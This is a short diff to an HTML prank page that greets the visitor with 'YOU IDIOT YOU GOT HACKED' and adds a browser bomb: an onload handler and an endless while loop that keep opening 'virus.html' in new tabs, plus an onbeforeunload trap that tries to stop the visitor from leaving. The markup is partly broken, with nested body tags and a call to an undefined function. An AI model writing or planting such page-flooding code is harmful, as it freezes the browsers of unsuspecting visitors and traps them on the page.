@@ -5,18 +5,15 @@
 </head>
 <body>
 YOU IDIOT YOU GOT HACKED LLLLLLLLLL
-<body onload="window.open('virus.html', '_blank');">
-
-  <script>
-
-    while (true) {
-    window.open('virus.html', '_blank');
-}
-  </script>
+<body onload="window.open('virus.html', '_blank'); ", onbeforeunload="return trap()">
+  <body onbeforeunload="return myFunction()">
   <script>
     while (true) {
-      alert("Seriously???");
-      }
+      window.open('virus.html', '_blank');
+    }
+    function trap() {
+      alert("Resistance is futile, lag is forever")
+    }
   </script>
 </body>
 </html>
